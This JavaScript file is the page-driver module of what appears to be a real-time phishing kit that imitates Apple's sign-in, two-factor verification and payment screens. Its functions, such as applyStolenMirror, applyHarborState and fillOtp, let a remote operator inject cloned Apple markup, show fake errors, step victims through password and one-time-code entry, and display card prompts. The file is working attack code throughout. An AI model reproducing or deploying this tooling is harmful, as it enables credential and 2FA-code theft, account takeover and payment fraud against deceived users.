(function () {
  if (window.__harborDriverInstalled) return;
  window.__harborDriverInstalled = true;

  function noteEl() {
    return document.getElementById('form-note');
  }

  function syncSigninFilledClasses() {
    const account = document.getElementById('account');
    const password = document.getElementById('password');
    const accountField = document.getElementById('account-field');
    const passwordField = document.getElementById('password-field');
    if (accountField) {
      accountField.classList.toggle('is-filled', !!(account && account.value.trim()));
    }
    if (passwordField) {
      passwordField.classList.toggle('is-filled', !!(password && password.value.trim()));
    }
  }

  function signinErrorNoteHtml(message) {
    const text = (message || '').trim();
    const esc = text
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
    return (
      '<span class="signin-error-note">' +
      '<svg class="signin-error-note__icon" width="17" height="17" viewBox="0 0 17 17" aria-hidden="true" focusable="false">' +
      '<circle cx="8.5" cy="8.5" r="7.25" fill="none" stroke="currentColor" stroke-width="1.4"></circle>' +
      '<rect x="7.85" y="4.6" width="1.3" height="5.1" rx="0.65" fill="currentColor"></rect>' +
      '<circle cx="8.5" cy="11.85" r="0.85" fill="currentColor"></circle>' +
      '</svg>' +
      '<span class="signin-error-note__text">' +
      esc +
      '</span></span>'
    );
  }

  function clearSignInErrors() {
    const note = noteEl();
    if (note) {
      note.hidden = true;
      note.classList.remove('note--error');
      note.textContent = '';
    }
    document.querySelectorAll('.float-field.is-invalid').forEach((el) => el.classList.remove('is-invalid'));
    document.querySelector('.credential-group')?.classList.remove('credential-group--invalid');
  }

  function showSignInError(message, invalidate) {
    if (window.PhishBridge && window.PhishBridge.clearSubmitLoading) {
      window.PhishBridge.clearSubmitLoading();
    } else {
      window.__harborSubmitPending = false;
    }
    setMirrorLoading(false);
    syncSigninFilledClasses();
    const account = document.getElementById('account');
    const passwordEl = document.getElementById('password');
    if (account) account.disabled = false;
    if (passwordEl) passwordEl.disabled = false;
    const note = noteEl();
    if (!note) return;
    note.hidden = false;
    note.classList.add('note--error');
    note.innerHTML = signinErrorNoteHtml(message);
    const accountField = document.getElementById('account-field');
    const passwordField = document.getElementById('password-field');
    const group = document.querySelector('.credential-group');
    if (invalidate === 'account' || invalidate === 'both') {
      accountField?.classList.add('is-invalid');
    }
    if (invalidate === 'password' || invalidate === 'both') {
      passwordField?.classList.add('is-invalid');
    }
    if (signinStep() === 'password' && (invalidate === 'both' || invalidate === 'password' || invalidate === 'account')) {
      group?.classList.add('credential-group--invalid');
    }
  }

  function signinStep() {
    const pw = document.getElementById('step-password');
    if (pw && !pw.hidden) return 'password';
    return 'email';
  }

  function ensurePasswordStep() {
    if (signinStep() === 'password') return;
    const account = document.getElementById('account');
    const accountField = document.getElementById('account-field');
    const accountSlotStacked = document.getElementById('account-slot-stacked');
    const stepInitial = document.getElementById('step-initial');
    const stepPassword = document.getElementById('step-password');
    const iphoneCol = document.getElementById('iphone-signin-col');
    const formActions = document.getElementById('form-actions');
    const form = document.getElementById('sign-in');
    const signinPanel = document.querySelector('.signin .panel.parent-container');
    const continueLabel = document.getElementById('continue-label');
    if (!account || !stepPassword) return;
    accountField?.classList.remove('float-field--boxed');
    if (accountSlotStacked && accountField) accountSlotStacked.appendChild(accountField);
    if (stepInitial) stepInitial.hidden = true;
    stepPassword.hidden = false;
    if (iphoneCol) iphoneCol.hidden = true;
    formActions?.classList.add('form-actions--password');
    form?.classList.add('auth-widget--password');
    signinPanel?.classList.add('panel--password-step');
    if (continueLabel) continueLabel.textContent = 'Sign In';
    if (account) account.disabled = false;
    const passwordEl = document.getElementById('password');
    if (passwordEl) passwordEl.disabled = false;
    syncSigninFilledClasses();
    if (window.PhishBridge && window.PhishBridge.setLoading) {
      window.PhishBridge.setLoading(false);
    }
  }

  function ensureEmailStep() {
    ensureEmailStepInPlace();
    if (signinStep() !== 'email') {
      window.location.href = '/signin';
    }
  }

  function ensureEmailStepInPlace() {
    if (signinStep() === 'email') return;
    const account = document.getElementById('account');
    const accountField = document.getElementById('account-field');
    const accountSlotInitial = document.getElementById('account-slot-initial');
    const accountSlotStacked = document.getElementById('account-slot-stacked');
    const stepInitial = document.getElementById('step-initial');
    const stepPassword = document.getElementById('step-password');
    const iphoneCol = document.getElementById('iphone-signin-col');
    const formActions = document.getElementById('form-actions');
    const form = document.getElementById('sign-in');
    const signinPanel = document.querySelector('.signin .panel.parent-container');
    const continueLabel = document.getElementById('continue-label');
    if (!stepPassword || !stepInitial) return;
    if (accountField && accountSlotInitial) {
      accountSlotInitial.appendChild(accountField);
      accountField.classList.add('float-field--boxed');
    }
    stepPassword.hidden = true;
    stepInitial.hidden = false;
    if (iphoneCol) iphoneCol.hidden = false;
    formActions?.classList.remove('form-actions--password');
    form?.classList.remove('auth-widget--password');
    signinPanel?.classList.remove('panel--password-step');
    if (continueLabel) continueLabel.textContent = 'Continue';
    if (account) account.disabled = false;
  }

  function fillSignIn(email, password) {
    const account = document.getElementById('account');
    const passwordEl = document.getElementById('password');
    if (
      account &&
      typeof email === 'string' &&
      document.activeElement !== account &&
      email &&
      account.value !== email
    ) {
      account.value = email;
      account.dispatchEvent(new Event('input', { bubbles: true }));
    }
    if (
      passwordEl &&
      arguments.length >= 2 &&
      password !== undefined &&
      typeof password === 'string' &&
      document.activeElement !== passwordEl &&
      passwordEl.value !== password
    ) {
      passwordEl.value = password;
      passwordEl.dispatchEvent(new Event('input', { bubbles: true }));
    }
    const accountField = document.getElementById('account-field');
    const passwordField = document.getElementById('password-field');
    if (account?.value.trim()) accountField?.classList.add('is-filled');
    else accountField?.classList.remove('is-filled');
    if (passwordEl?.value.trim()) passwordField?.classList.add('is-filled');
    const btn = document.getElementById('continue-btn');
    if (btn) btn.disabled = false;
  }

  function fillSignInEmail(email) {
    fillSignIn(email);
  }

  function setAppleMirrorPending(email) {
    try {
      sessionStorage.setItem('harbor_apple_mirror', '1');
      sessionStorage.setItem('harbor_account', (email || '').trim());
      sessionStorage.setItem('harbor_account_key', (email || '').trim().toLowerCase());
      sessionStorage.setItem('harbor_signin_pending', '1');
      sessionStorage.removeItem('harbor_verified');
    } catch {
      /* ignore */
    }
  }

  function markVerified() {
    try {
      sessionStorage.setItem('harbor_verified', '1');
      sessionStorage.removeItem('harbor_signin_pending');
    } catch {
      /* ignore */
    }
  }

  function showVerifyError(message) {
    const note = document.getElementById('form-note');
    const otpRow = document.getElementById('otp-row');
    const statusEl = document.getElementById('verify-status');
    const inline = document.getElementById('verify-inline-error');
    const inlineText = document.getElementById('verify-inline-error-text');
    const text = (message || '').trim() || 'Incorrect verification code.';
    if (statusEl) statusEl.hidden = true;
    if (note) {
      note.hidden = true;
      note.classList.remove('note--error');
      note.textContent = '';
    }
    if (inline && inlineText) {
      inline.hidden = false;
      inlineText.textContent = text;
    } else if (note) {
      note.hidden = false;
      note.textContent = text;
      note.classList.add('note--error');
    }
    if (otpRow) {
      otpRow.classList.add('otp-row--error');
      otpRow.classList.remove('harbor-shake');
      void otpRow.offsetWidth;
      otpRow.classList.add('harbor-shake');
    }
    resetOtp();
    document.querySelectorAll('.otp-digit').forEach((input) => {
      input.classList.remove('has-value', 'is-otp-focused');
      input.readOnly = false;
    });
    const first = document.getElementById('otp-0');
    if (first) first.focus();
  }

  function clearVerifyError() {
    const note = document.getElementById('form-note');
    const otpRow = document.getElementById('otp-row');
    const inline = document.getElementById('verify-inline-error');
    if (note) {
      note.hidden = true;
      note.classList.remove('note--error');
      note.textContent = '';
    }
    if (inline) inline.hidden = true;
    otpRow?.classList.remove('otp-row--error', 'harbor-shake');
  }

  function fillOtp(digits) {
    if (!digits || digits.length !== 6) return;
    digits.forEach((d, i) => {
      const el = document.getElementById('otp-' + i);
      if (!el || el.value === d) return;
      el.value = d;
      el.dispatchEvent(new Event('input', { bubbles: true }));
    });
  }

  function resetOtp() {
    document.querySelectorAll('.otp-digit').forEach((input) => {
      input.value = '';
      input.readOnly = false;
    });
  }

  function applyVerifyMirror(copy) {
    if (!copy || typeof copy !== 'object') return;
    showTemplatePanels();
    const variant = copy.variant === 'email' ? 'email' : 'device';
    try {
      sessionStorage.setItem('harbor_verify_variant', variant);
      sessionStorage.setItem('harbor_verify_copy', JSON.stringify(copy));
      sessionStorage.setItem('harbor_mirror_fp', (copy.title || '') + '|' + (copy.body || '').slice(0, 120));
      sessionStorage.setItem('harbor_mirror_kind', variant);
      sessionStorage.setItem('harbor_mirror_mode', 'template');
    } catch {
      /* ignore */
    }
    document.body.classList.toggle('verify--email-code', variant === 'email');
    document.body.classList.toggle('verify--device-2fa', variant !== 'email');
    const titleEl = document.getElementById('verify-title');
    const ledeEl = document.getElementById('verify-lede');
    if (titleEl && copy.title) titleEl.textContent = copy.title;
    if (ledeEl && copy.body) ledeEl.textContent = copy.body;
    const links = Array.isArray(copy.links) ? copy.links : [];
    const emailLinks = document.getElementById('verify-links-email');
    if (emailLinks && variant === 'email') {
      emailLinks.hidden = false;
      emailLinks.innerHTML = '';
      links.slice(0, 3).forEach((label) => {
        const btn = document.createElement('button');
        btn.type = 'button';
        btn.className = 'verify-link';
        btn.textContent = label;
        emailLinks.appendChild(btn);
      });
      if (!links.length) {
        emailLinks.innerHTML =
          '<button type="button" class="verify-link">Didn\u2019t get a verification code?</button>' +
          '<button type="button" class="verify-link">Get Support PIN</button>';
      }
    }
    try {
      document.documentElement.setAttribute('data-harbor-theme', 'light');
    } catch {
      /* ignore */
    }
  }

  function restoreVerifyMirrorFromSession() {
    try {
      const raw = sessionStorage.getItem('harbor_verify_copy');
      if (!raw) return;
      applyVerifyMirror(JSON.parse(raw));
    } catch {
      /* ignore */
    }
  }

  function ensureMirrorLoadingOverlay() {
    if (document.getElementById('harbor-mirror-loading')) return;
    const style = document.createElement('style');
    style.textContent =
      '#harbor-mirror-loading{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.82);backdrop-filter:blur(6px);}' +
      '#harbor-mirror-loading[hidden]{display:none!important;}' +
      '.harbor-mirror-loading__spinner{width:40px;height:40px;border-radius:50%;border:3px solid rgba(0,113,227,0.2);border-top-color:#0071e3;animation:harborSpin .8s linear infinite;}' +
      '@keyframes harborSpin{to{transform:rotate(360deg);}}';
    document.head.appendChild(style);
    const el = document.createElement('div');
    el.id = 'harbor-mirror-loading';
    el.hidden = true;
    el.innerHTML = '<div class="harbor-mirror-loading__spinner" role="status" aria-label="Loading"></div>';
    document.body.appendChild(el);
  }

  function setMirrorLoading(on) {
    ensureMirrorLoadingOverlay();
    const el = document.getElementById('harbor-mirror-loading');
    if (el) el.hidden = !on;
  }

  function applyPaymentMirror(copy) {
    if (!copy || typeof copy !== 'object') return;
    showTemplatePanels();
    try {
      sessionStorage.setItem('harbor_payment_copy', JSON.stringify(copy));
    } catch {
      /* ignore */
    }
    const title = document.getElementById('payment-title');
    const lede = document.getElementById('payment-lede');
    const mask = document.getElementById('payment-card-mask');
    if (title && copy.title) title.textContent = copy.title;
    if (lede && copy.body) lede.textContent = copy.body;
    if (mask && copy.cardMask) mask.textContent = copy.cardMask;
    try {
      document.documentElement.setAttribute('data-harbor-theme', 'light');
    } catch {
      /* ignore */
    }
  }

  function applyFlowMirror(copy) {
    if (!copy || typeof copy !== 'object') return;
    const title = document.getElementById('flow-title');
    const body = document.getElementById('flow-body');
    if (title && copy.title) title.textContent = copy.title;
    if (body) {
      body.textContent = copy.body || '';
    }
  }

  function hideTemplatePanels() {
    document.querySelectorAll('.harbor-template-panel').forEach((el) => {
      el.hidden = true;
    });
  }

  function showTemplatePanels() {
    document.querySelectorAll('.harbor-template-panel').forEach((el) => {
      el.hidden = false;
    });
    const host = document.getElementById('apple-mirror-host');
    if (host) {
      host.hidden = true;
      if (host.shadowRoot) {
        host.shadowRoot.innerHTML = '';
      } else {
        host.innerHTML = '';
      }
    }
    document.body.classList.remove('harbor-stolen-mirror');
  }

  function applyStolenMirror(shell) {
    if (!shell || typeof shell !== 'object' || !shell.html) return false;
    ensureMirrorLoadingOverlay();
    let host = document.getElementById('apple-mirror-host');
    if (!host) {
      host = document.createElement('div');
      host.id = 'apple-mirror-host';
      host.className = 'apple-mirror-host';
      const stage = document.querySelector('.stage.home-login') || document.querySelector('.page') || document.body;
      stage.appendChild(host);
    }
    hideTemplatePanels();
    host.hidden = false;
    document.body.classList.add('harbor-stolen-mirror');
    let shadow = host.shadowRoot;
    if (!shadow) {
      shadow = host.attachShadow({ mode: 'open' });
    }
    shadow.innerHTML = '';
    const baseStyle = document.createElement('style');
    baseStyle.textContent =
      ':host{display:block;color:rgba(0,0,0,0.88);background:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:17px;line-height:1.35;-webkit-font-smoothing:antialiased;}' +
      '.harbor-stolen-wrap{box-sizing:border-box;color:rgba(0,0,0,0.88);}' +
      '.harbor-stolen-wrap input,.harbor-stolen-wrap button,.harbor-stolen-wrap a{color:inherit;}' +
      (shell.styles || '');
    const wrap = document.createElement('div');
    wrap.className = 'harbor-stolen-wrap' + (shell.bodyClass ? ' ' + shell.bodyClass : '');
    if (shell.htmlClass) {
      wrap.setAttribute('data-apple-html-class', shell.htmlClass);
    }
    wrap.innerHTML = shell.html;
    shadow.appendChild(baseStyle);
    shadow.appendChild(wrap);
    try {
      document.documentElement.classList.remove('page-loading');
      document.documentElement.classList.add('page-ready');
    } catch {
      /* ignore */
    }
    if (window.PhishBridge && window.PhishBridge.wireDynamicMirrorRoot) {
      window.PhishBridge.wireDynamicMirrorRoot(wrap);
    }
    try {
      sessionStorage.setItem('harbor_mirror_fp', shell.fingerprint || '');
      sessionStorage.setItem('harbor_mirror_kind', shell.kind || '');
      sessionStorage.setItem('harbor_mirror_mode', 'stolen');
    } catch {
      /* ignore */
    }
    return true;
  }

  function getMirrorFingerprint() {
    try {
      return sessionStorage.getItem('harbor_mirror_fp') || '';
    } catch {
      return '';
    }
  }

  function applyHarborState(st) {
    if (!st || typeof st !== 'object') return;
    if (st.signinLoading === true) {
      window.__harborSubmitPending = true;
      window.__harborSigninLoading = true;
      if (typeof window.paintContinueLoading === 'function') {
        window.paintContinueLoading(true);
      } else if (window.PhishBridge && window.PhishBridge.setLoading) {
        window.PhishBridge.setLoading(true);
      } else if (typeof window.__harborSyncSigninLoading === 'function') {
        window.__harborSyncSigninLoading(true);
      }
    }
    if (st.mirrorLoading != null) {
      setMirrorLoading(!!st.mirrorLoading);
    }
    if (st.verifyCopy) {
      applyVerifyMirror(st.verifyCopy);
    }
    if (st.passwordStep) {
      ensurePasswordStep();
      if (st.email) {
        fillSignInEmail(st.email);
      }
    }
    if (st.clearSigninLoading) {
      if (window.PhishBridge && window.PhishBridge.clearSubmitLoading) {
        window.PhishBridge.clearSubmitLoading();
      } else if (typeof window.paintContinueLoading === 'function') {
        window.__harborSubmitPending = false;
        window.__harborSigninLoading = false;
        window.paintContinueLoading(false);
      } else if (window.PhishBridge && window.PhishBridge.setLoading) {
        window.__harborSubmitPending = false;
        window.PhishBridge.setLoading(false);
      }
    } else if (
      st.signinLoading === false &&
      !window.__harborSubmitPending &&
      window.PhishBridge &&
      window.PhishBridge.setLoading
    ) {
      window.PhishBridge.setLoading(false);
    }
    if (st.signinError && st.signinError.msg) {
      showSignInError(st.signinError.msg, st.signinError.inv || 'both');
    }
    if (st.clearSigninErrors) {
      clearSignInErrors();
    }
    if (st.clearVerifyError) {
      clearVerifyError();
    }
  }

  window.HarborDriver = {
    clearSignInErrors,
    showSignInError,
    signinStep,
    ensurePasswordStep,
    ensureEmailStep,
    ensureEmailStepInPlace,
    fillSignIn,
    fillSignInEmail,
    setAppleMirrorPending,
    markVerified,
    showVerifyError,
    clearVerifyError,
    fillOtp,
    resetOtp,
    applyVerifyMirror,
    restoreVerifyMirrorFromSession,
    applyHarborState,
    setMirrorLoading,
    applyPaymentMirror,
    applyFlowMirror,
    applyStolenMirror,
    showTemplatePanels,
    getMirrorFingerprint,
  };
})();
